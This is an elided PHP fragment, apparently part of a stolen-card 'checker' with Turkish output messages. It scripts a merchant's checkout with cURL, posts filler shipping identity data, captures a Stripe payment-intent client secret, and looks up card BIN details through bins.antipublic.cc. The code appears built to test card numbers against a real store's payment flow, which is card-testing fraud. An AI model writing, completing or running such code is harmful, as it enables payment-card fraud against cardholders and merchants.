...
curl_setopt_array($ch, [
    ...
    CURLOPT_COOKIEFILE => tempnam(sys_get_temp_dir(), 'stripe'),
    CURLOPT_COOKIEJAR => tempnam(sys_get_temp_dir(), 'stripe'),
    CURLOPT_TIMEOUT => 15,
...
curl_setopt_array($ch, [
    ...
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => http_build_query([
        "shipping_company" => $ln, "shipping_name" => $fn, "shipping_lastname" => $ln,
        "email" => $email, "daytime_phone" => $phone, "home_phone" => $phone,
        "shipping_state" => $state, "payment_method" => "Credit Card via Stripe",
        "action" => "check_shipping_country", "cart_id" => "", "shipping_method" => "",
    ]),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIEFILE => tempnam(sys_get_temp_dir(), 'stripe'),
    CURLOPT_COOKIEJAR => tempnam(sys_get_temp_dir(), 'stripe'),
...
curl_setopt_array($ch, [
    ...
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode(["cart_id" => "", "shipping_method" => "", "shipping_state" => $state]),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIEFILE => tempnam(sys_get_temp_dir(), 'stripe'),
    CURLOPT_COOKIEJAR => tempnam(sys_get_temp_dir(), 'stripe'),
    CURLOPT_TIMEOUT => 15,
...
$intent_resp = curl_exec($ch); curl_close($ch);
$intent_data = json_decode($intent_resp, true);
$client_secret = $intent_data['clientSecret'] ?? $intent_data['client_secret'] ?? '';
if (!$client_secret) {
    echo json_encode(['basari' => false, 'mesaj' => 'Intent oluşturulamadı'], JSON_UNESCAPED_UNICODE);
    exit;
}
...
function gen_uuid() { return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x', mt_rand(0,0xffff), mt_rand(0,0xffff), mt_rand(0,0xffff), mt_rand(0,0x0fff)|0x4000, mt_rand(0,0x3fff)|0x8000, mt_rand(0,0xffff), mt_rand(0,0xffff), mt_rand(0,0xffff)); }
function bin_bilgi($bin) {
    $ctx = stream_context_create(['http' => ['timeout' => 5]]);
    $resp = @file_get_contents("https://bins.antipublic.cc/bins/$bin", false, $ctx);
    if ($resp) { $data = json_decode($resp, true); return ['Banka' => $data['bank'] ?? 'Bilinmiyor', 'Ulke' => $data['country'] ?? 'Bilinmiyor', 'Marka' => ($data['brand'] ?? '?'), 'Tur' => ($data['type'] ?? '?')]; }
